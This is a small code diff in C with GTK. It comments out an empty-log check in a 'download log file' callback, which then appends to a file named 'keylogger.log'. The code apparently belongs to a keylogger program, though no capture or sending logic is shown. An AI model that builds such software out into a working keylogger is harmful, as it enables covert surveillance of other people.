@@ -225,6 +225,7 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
     GtkWidget *log_file_empty_dialog = NULL;
     
     
+    /*
     if(log_empty == 1)
     {
         log_empty = 0;
@@ -243,6 +244,7 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
                 return;
         }     
     }
+     */
 
     log_file = fopen("keylogger.log", "a");
     if(log_file == NULL)
